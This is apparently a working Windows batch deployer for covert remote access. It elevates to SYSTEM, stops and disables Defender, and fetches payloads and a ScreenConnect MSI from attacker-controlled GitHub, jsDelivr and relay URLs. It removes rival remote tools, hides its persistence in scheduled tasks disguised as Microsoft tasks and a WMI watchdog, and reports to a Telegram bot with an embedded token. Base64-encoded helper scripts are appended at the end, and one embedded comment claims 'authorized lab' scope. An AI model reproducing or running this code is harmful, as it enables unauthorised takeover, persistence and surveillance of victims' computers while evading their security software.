@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O22 - unharden-before-write (self-lock fix) + embed + identity + watchdog + pkg.msi fallback
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O22 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O22: prior S4 hardening (+h +s) makes copy/move over old files fail silently.
  REM Strip attrs first, then VERIFY the copy is really this build - else use a fresh unique runner.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  copy /y "%~f0" "%BOOT%\own_run.cmd" >nul 2>&1
  if not exist "%BOOT%\own_run.cmd" (
    echo ERROR: cannot write %BOOT%\own_run.cmd
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O22" "%BOOT%\own_run.cmd" >nul 2>&1
  if errorlevel 1 (
    set "RUNNER=%BOOT%\own_o22_%RANDOM%%RANDOM%.cmd"
    copy /y "%~f0" "!RUNNER!" >nul 2>&1
    echo runner_fallback_unique>>"%LOG%" 2>nul
  ) else (
    mkdir "%WD%" >nul 2>&1
    attrib -h -s -r "%SELF%" >nul 2>&1
    copy /y "%BOOT%\own_run.cmd" "%SELF%" >nul 2>&1
    set "RUNNER=%SELF%"
    findstr /C:"OWN BUILD 20260802O22" "%SELF%" >nul 2>&1
    if errorlevel 1 set "RUNNER=%BOOT%\own_run.cmd"
  )
  echo go_start %DATE% %TIME%>"%LOG%" 2>nul
  if not exist "%LOG%" (
    set "LOG=%BOOT%\boot.err"
    echo go_start %DATE% %TIME%>"%LOG%"
  )
  echo order=msi_then_primary_then_nuke_foreign>>"%LOG%"
  echo engine=cmd_detached_o22>>"%LOG%"
  echo whoami_launcher=>>"%LOG%"
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%"
  echo runner=!RUNNER!>>"%LOG%"
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      set "PROOF=0"
      for /l %%N in (1,1,6) do (
        if exist "%BOOT%\wproof" set "PROOF=1"
        if not exist "%BOOT%\wproof" timeout /t 2 /nobreak >nul 2>&1
      )
      if "!PROOF!"=="1" (
        set "DETACH_OK=1"
        echo detach_via=schtasks_root>>"%LOG%"
      ) else (
        echo detach_a_noproof>>"%LOG%"
        type "%BOOT%\detach.task" >>"%LOG%" 2>&1
        type "%BOOT%\detach.run" >>"%LOG%" 2>&1
      )
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)
    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O22 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
echo embed_extract_done>>"%LOG%"

REM O22: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M13" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S5" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T8" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L3" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (repair-first ladder)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM service deleted but product registered: repair in place (no SC-family msiexec collision)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo primary_svc_missing_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks the SC custom action - clear it
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/stopped - MSI install...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus REBOOT=ReallySuppress /L*v "%WD%\msi_reinstall.log"
echo msi_reinstall_!ERRORLEVEL!>>"%LOG%"
timeout /t 10 /nobreak >nul

REM post-install: product registered but service entry still missing -> repair by GUID
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O22: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,2 delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%V"
if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpAddressConflict1"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
echo identity_A=%TASK_A%>>"%LOG%"
echo identity_B=%TASK_B%>>"%LOG%"
echo identity_C=%TASK_C%>>"%LOG%"
echo identity_D=%TASK_D% mo=%MO_A%/%MO_B%>>"%LOG%"

REM schtasks /TR: single-level quotes only; paths never contain spaces
schtasks /Delete /TN "%TASK_A%" /F >nul 2>&1
schtasks /Create /TN "%TASK_A%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_A% /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
schtasks /Delete /TN "%TASK_B%" /F >nul 2>&1
schtasks /Create /TN "%TASK_B%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_B% /F /TR "cmd.exe /c %ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1
schtasks /Delete /TN "%TASK_C%" /F >nul 2>&1
schtasks /Create /TN "%TASK_C%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
schtasks /Delete /TN "%TASK_D%" /F >nul 2>&1
schtasks /Create /TN "%TASK_D%" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
echo persist_armed_identity>>"%LOG%"
REM verify tasks really registered
schtasks /Query /TN "%TASK_A%" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_B%" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_C%" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_D%" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O22 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  >"%WD%\notify.cfg" echo BOT_TOKEN=8619715754:AAFMk2NjND-hQk2xPFYjicHfB5MyKtcXCqg
  >>"%WD%\notify.cfg" echo CHAT_ID=7547462070
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O22 >>"%LOG%" 2>&1
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKcmVtICBPV05fTU9OICBCVUlMRCAyMDI2
MDgwMk0xMwpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50aS1z
aWduYXR1cmUpLCBtdXR1YWwKcmVtICBXTUkrc2NodGFza3MgY2hhaW5zLCBNU0kgZmFsbGJhY2sg
Y2hhaW4sIHN0YXRlLmpzb24sIGRpZ2VzdCBIQi4KcmVtICBBdXRob3JpemVkIGludGVybmFsIGRl
cGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4KcmVtIOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkApzZXRsb2NhbCBFbmFibGVEZWxheWVkRXhwYW5zaW9uCgpzZXQgIktFRVBfRlA9NWY2MDEw
NTc5ODUyZTUwNyIKc2V0ICJBTFRfRlA9Zjg2MWM4MTQwZDQ1MzQyNyIKc2V0ICJXRD1DOlxQcm9n
cmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSIKc2V0ICJFVEw9Qzpc
UHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLmV0bGNhY2hlIgpzZXQgIkxP
Rz0lV0QlXG93bl9tb24ubG9nIgpzZXQgIlNUQVRFPSVXRCVcb3duX21vbi5zdGF0ZSIKc2V0ICJI
QkZMQUc9JVdEJVxoYi5mbGFnIgpzZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1cmwu
ZXhlIgpzZXQgIlRHPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9n
aXRodWItZHJvcC9tYWluL3RnX3JlcG9ydC5wczEiCnNldCAiVEcyPWh0dHBzOi8vY2RuLmpzZGVs
aXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL3RnX3JlcG9ydC5wczEiCnNldCAi
T1dOU0VDPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWIt
ZHJvcC9tYWluL293bl9zZWN1cmUuY21kIgpzZXQgIk9XTlNFQzI9aHR0cHM6Ly9jZG4uanNkZWxp
dnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX3NlY3VyZS5jbWQiCnNldCAi
T1dOTU9OPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWIt
ZHJvcC9tYWluL293bl9tb24uY21kIgpzZXQgIk9XTk1PTjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIu
bmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX21vbi5jbWQiCnNldCAiT1dOTElC
PWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9t
YWluL293bl9saWIucHMxIgpzZXQgIk9XTkxJQjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2do
L3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX2xpYi5wczEiCnNldCAiTVNJX1VSTD1odHRw
czovL3NldnJ6LmNvbS9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaSIKc2V0ICJNU0lfUEtH
MT1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3Av
bWFpbi9wa2cubXNpIgpzZXQgIk1TSV9QS0cyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94
bm9idWRkeS9naXRodWItZHJvcEBtYWluL3BrZy5tc2kiCnNldCAiTVNJPSVQcm9ncmFtRGF0YSVc
U2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2kiCgppZiBub3QgZXhpc3QgIiVXRCUiIG1kICIl
V0QlIiAyPm51bAppZiBub3QgZXhpc3QgIiVMT0clIiB0eXBlIG51bD4iJUxPRyUiIDI+bnVsCgpz
ZXQgIk1PTlZFUj1NMTMiCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIgpmb3IgL2YgInRv
a2Vucz0xLTMgZGVsaW1zPS8gIiAlJWEgaW4gKCIlZGF0ZSUiKSBkbyBzZXQgIkRUPSVkYXRlJSAl
dGltZSUiCmVjaG8uPj4iJUxPRyUiCmVjaG8g4pSA4pSAIHRpY2sgIURUISBbdmVyICVNT05WRVIl
XSDilIDilIA+PiIlTE9HJSIKc2V0ICJDT1VOVD0wIgpzZXQgIklOU1RBTExFRD0wIgpzZXQgIlBS
SU1fT0s9MCIKc2V0ICJBTFRfT0s9MCIKc2V0ICJGT1JFSUdOX0xFRlQ9MCIKc2V0ICJGT1JFSUdO
X0xJU1Q9IgpzZXQgIk1TSUVYSVQ9bm90LXJ1biIKCnJlbSDilIDilIAgcGVyLWhvc3QgaWRlbnRp
dHkgKGFudGktc2lnbmF0dXJlKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKaWYgbm90IGV4aXN0ICIlV0QlXGlk
ZW50aXR5LmNmZyIgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJv
ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
b3duX2xpYi5wczEiIC1BY3Rpb24gaW5pdCAtV29ya0RpciAiJVdEJSIgPm51bCAyPiYxCmlmIGV4
aXN0ICIlV0QlXGlkZW50aXR5LmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwyIGRlbGlt
cz09IiAlJUsgaW4gKCIlV0QlXGlkZW50aXR5LmNmZyIpIGRvIHNldCAiJSVLPSUlViIKaWYgbm90
IGRlZmluZWQgVEFTS19BIHNldCAiVEFTS19BPVxNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNc
U2NoZWR1bGVkIgppZiBub3QgZGVmaW5lZCBUQVNLX0Igc2V0ICJUQVNLX0I9XE1pY3Jvc29mdFxX
aW5kb3dzXFBMQVxTZXJ2ZXIiCmlmIG5vdCBkZWZpbmVkIFRBU0tfQyBzZXQgIlRBU0tfQz1cTWlj
cm9zb2Z0XFdpbmRvd3NcV0RJXFJlc29sdXRpb25Ib3N0IgppZiBub3QgZGVmaW5lZCBUQVNLX0Qg
